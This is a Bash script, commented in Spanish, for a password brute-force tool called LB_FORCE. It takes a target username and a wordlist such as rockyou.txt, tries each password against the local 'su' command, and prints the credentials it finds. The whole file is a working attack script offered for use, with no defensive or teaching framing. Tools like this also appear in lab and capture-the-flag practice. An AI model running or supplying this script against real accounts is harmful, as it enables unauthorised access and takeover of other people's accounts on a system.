#!/bin/bash

# Colores para la salida
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Función para mostrar el banner
show_banner() {
    clear
    echo -e "${BLUE}=== LB_FORCE - Herramienta de Fuerza Bruta ===${NC}"
    echo
    echo -e "${YELLOW}Desarrollado por:${NC}"
    echo -e "${GREEN}LinkedIn:${NC} www.linkedin.com/in/axel-tear"
    echo -e "${GREEN}GitHub:${NC} https://github.com/oliverexx"
    echo
}

# Función de ayuda
usage() {
    show_banner
    echo -e "${YELLOW}Uso:${NC} $0 -u <usuario> -w <diccionario>"
    echo
    echo -e "${YELLOW}Opciones:${NC}"
    echo -e "  ${GREEN}-u <usuario>${NC}     Usuario al que se le intentará hacer fuerza bruta."
    echo -e "  ${GREEN}-w <diccionario>${NC} Ruta al archivo de diccionario (ej. rockyou.txt)."
    echo -e "  ${GREEN}-h${NC}               Mostrar esta ayuda."
    echo
    exit 1
}

# Mostrar banner al inicio
show_banner

# Procesar argumentos
while getopts ":u:w:h" opt; do
    case $opt in
        u) USER=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Verificar que los argumentos no estén vacíos
if [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    echo -e "${RED}[!] Error: Faltan argumentos requeridos${NC}"
    usage
fi

# Verificar que el archivo de diccionario exista
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] El archivo de diccionario no existe: $WORDLIST${NC}"
    exit 1
fi

# Comenzar el ataque de fuerza bruta
echo -e "${BLUE}[*] Iniciando ataque de fuerza bruta${NC}"
echo -e "${YELLOW}[*] Usuario:${NC} $USER"
echo -e "${YELLOW}[*] Diccionario:${NC} $WORDLIST"
echo

# Contador de intentos
ATTEMPTS=0
TOTAL_LINES=$(wc -l < "$WORDLIST")

echo -e "${BLUE}[*] Total de contraseñas a probar:${NC} $TOTAL_LINES"
echo -e "${BLUE}[*] Iniciando prueba de contraseñas...${NC}"
echo

while read -r PASS; do
    ((ATTEMPTS++))
    
    # Mostrar progreso cada 100 intentos
    if (( ATTEMPTS % 100 == 0 )); then
        echo -ne "\r${YELLOW}[*] Progreso:${NC} $ATTEMPTS/$TOTAL_LINES intentos (${GREEN}$((ATTEMPTS * 100 / TOTAL_LINES))%${NC})"
    fi
    
    echo "$PASS" | su - "$USER" -c "exit" &>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "\n${GREEN}[+] ¡Credenciales válidas encontradas!${NC}"
        echo -e "${GREEN}[+] Usuario:${NC} $USER"
        echo -e "${GREEN}[+] Contraseña:${NC} $PASS"
        break
    fi
done < "$WORDLIST"

echo
echo -e "${BLUE}[*] Finalizado.${NC}"
echo -e "${YELLOW}[*] Total de intentos realizados:${NC} $ATTEMPTS"
